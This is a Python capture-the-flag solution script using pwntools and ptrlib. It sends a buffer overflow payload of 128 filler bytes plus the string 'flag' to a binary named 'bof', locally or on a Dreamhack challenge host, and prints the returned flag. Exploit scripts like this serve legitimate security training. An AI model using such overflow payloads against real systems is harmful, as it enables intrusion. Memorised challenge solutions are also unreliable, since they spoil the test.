#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./bof")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 22091)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    payload = b""
    payload += b"A" * 128
    payload += b"flag"

    io.sendline(payload)
    io.recvuntil("DH{")
    flag = b"DH{" + io.recvuntil("}")
    print(f"flag: {flag.decode()}")
    return


if __name__ == "__main__":
    main()
